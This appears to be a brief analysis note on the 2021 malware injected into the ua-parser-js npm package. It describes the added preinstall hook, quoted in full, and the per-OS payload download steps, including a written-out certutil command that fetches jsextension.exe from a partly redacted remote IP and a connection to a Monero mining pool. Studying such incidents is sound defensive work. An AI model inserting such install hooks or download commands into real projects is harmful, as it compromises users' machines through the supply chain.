# ua-parser-vuln

## Data Sources:

Read the diff here: https://my.diffend.io/npm/ua-parser-js/0.7.28/0.7.29#d2h-701945

Virustotal: https://www.virustotal.com/gui/file/2a3acdcd76575762b18c18c644a745125f55ce121f742d2aad962521bc7f25fd/behavior/C2AE

CISA Announcement: https://us-cert.cisa.gov/ncas/current-activity/2021/10/22/malware-discovered-popular-npm-package-ua-parser-js

Therecord: https://therecord.media/malware-found-in-npm-package-with-millions-of-weekly-downloads/

## Brief overview
Package.json file has the line:
 ""preinstall": "start /B node preinstall.js & node preinstall.js"," added,  calls the new attack scripts.

File preinstall.js looks to determine Windows, mac, linux, and call the correct next file

### Linux
On the linux side: It checks the server IP, if in the RU/UA/BY/KZ geo, does nothing. 
Else, it pulls down  jsextention from a remote IP in the Latvia GEO

### Windows:
1. Pulls down jsextension.exe  (Server serving is not responding)
2. Tries to curl it down
3. If that doesn work, tries wget
4. If that doesnt work, tries certutil
    it runs “certutil.exe -urlcache -f http://159.XXX.XXX.XXX/download/jsextension.exe jsextension.exe
    
5. Then attempts to pull down create.dll from citation<redaction>.at
    Currently at a russian IP address block
6. Then adds the execute to tasklist , to connect to pool.minexmr.****

